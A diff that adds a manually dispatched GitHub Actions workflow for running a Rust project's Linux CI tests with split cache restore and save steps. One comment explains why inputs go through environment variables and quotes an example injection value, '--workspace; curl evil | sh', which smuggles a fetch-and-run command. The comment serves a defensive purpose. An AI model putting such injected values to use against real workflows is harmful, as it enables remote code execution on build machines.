@@ -1,0 +1,142 @@
+name: CI (Linux only)
+
+# Manual-dispatch mirror of the ubuntu-latest leg of ci.yml, for isolating a
+# Linux-only failure without spending compute on the whole matrix. Runs only
+# when triggered by hand — no push or pull_request trigger — so it costs
+# nothing until asked.
+
+on:
+  workflow_dispatch:
+    inputs:
+      test_args:
+        description: "Extra args appended to `cargo test` (e.g. `-p par-term --lib`) for isolating a failure"
+        type: string
+        default: "--workspace"
+      test_threads:
+        description: "Value for --test-threads (1 serialises the harness so the last name printed is the test that crashed)"
+        type: string
+        default: ""
+      release_build:
+        description: "Also run the release build (slow; the rest of the ubuntu matrix leg)"
+        type: boolean
+        default: false
+
+permissions:
+  contents: read
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  test-linux:
+    name: Test - ubuntu-latest
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+
+    steps:
+    - uses: actions/checkout@v7
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v7
+      with:
+        node-version: 22
+
+    - name: Install Rust toolchain
+      # Pinned to the 1.98.0 branch of the action, matching rust-toolchain.toml.
+      # To find the SHA: git ls-remote https://github.com/dtolnay/rust-toolchain refs/heads/1.98.0
+      uses: dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0
+
+    - name: Install Linux dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y libxkbcommon-dev libwayland-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev libasound2-dev libgtk-3-dev libxdo-dev
+
+    - name: Install ACP bridge
+      run: make install-acp
+
+    # Restore and save are split deliberately. `actions/cache` writes the cache
+    # in an implicit post-step, which GitHub skips when the job fails — so a
+    # streak of red runs never warms the cache and every attempt recompiles
+    # from scratch. The matching save steps at the end of this job run with
+    # `if: always()`. Key scheme is unchanged.
+    - name: Restore cargo registry
+      id: cache-registry
+      uses: actions/cache/restore@v6
+      with:
+        path: ~/.cargo/registry
+        key: ${{ runner.os }}-cargo-registry-${{ hashFiles('**/Cargo.lock') }}
+
+    - name: Restore cargo index
+      id: cache-index
+      uses: actions/cache/restore@v6
+      with:
+        path: ~/.cargo/git
+        key: ${{ runner.os }}-cargo-index-${{ hashFiles('**/Cargo.lock') }}
+
+    - name: Restore target directory
+      id: cache-target
+      uses: actions/cache/restore@v6
+      with:
+        path: target
+        key: ${{ runner.os }}-cargo-build-target-${{ hashFiles('**/Cargo.lock') }}
+
+    - name: Enable core dumps
+      run: |
+        ulimit -c unlimited || true
+        sudo sysctl -w kernel.core_pattern=/tmp/core.%e.%p || true
+
+    - name: Run tests
+      # Both dispatch inputs reach the shell through env rather than `${{ }}`.
+      # `${{ }}` is substituted into the script text before bash parses it, so a
+      # dispatched value of `--workspace; curl evil | sh` would run as a second
+      # command. An expanded variable is only word-split and globbed, never
+      # re-parsed for metacharacters. $TEST_ARGS and $threads are therefore left
+      # unquoted on purpose — both carry several cargo arguments and must split.
+      env:
+        TEST_ARGS: ${{ inputs.test_args }}
+        TEST_THREADS: ${{ inputs.test_threads }}
+      run: |
+        threads=""
+        if [ -n "$TEST_THREADS" ]; then
+          threads="-- --test-threads=$TEST_THREADS"
+        fi
+        echo "cargo test $TEST_ARGS $threads"
+        # shellcheck disable=SC2086  # TEST_ARGS/threads are intentional space-separated arg lists
+        RUST_BACKTRACE=1 cargo test $TEST_ARGS $threads
+
+    - name: Build release
+      if: inputs.release_build
+      run: cargo build --release --verbose
+
+    # Save even when the steps above failed. Skipped on an exact key hit, where
+    # there is nothing new to write.
+    #
+    # Cache keys are immutable: the first run to reach this step for a given
+    # Cargo.lock wins, and a later, more complete run cannot overwrite it. That
+    # is a deliberate trade here. cargo compiles dependencies before workspace
+    # crates, so even a run that dies compiling par-term has already cached the
+    # expensive, stable part — and the workspace crates change on every
+    # iteration of a debugging streak, so they would be rebuilt either way.
+    # Versioning the key per run would remove the limitation in general, but it
+    # would rewrite a multi-GB target cache on every run and evict the registry
+    # caches under the 10GB per-repo limit.
+    - name: Save cargo registry
+      if: always() && steps.cache-registry.outputs.cache-hit != 'true'
+      uses: actions/cache/save@v6
+      with:
+        path: ~/.cargo/registry
+        key: ${{ steps.cache-registry.outputs.cache-primary-key }}
+
+    - name: Save cargo index
+      if: always() && steps.cache-index.outputs.cache-hit != 'true'
+      uses: actions/cache/save@v6
+      with:
+        path: ~/.cargo/git
+        key: ${{ steps.cache-index.outputs.cache-primary-key }}
+
+    - name: Save target directory
+      if: always() && steps.cache-target.outputs.cache-hit != 'true'
+      uses: actions/cache/save@v6
+      with:
+        path: target
+        key: ${{ steps.cache-target.outputs.cache-primary-key }}
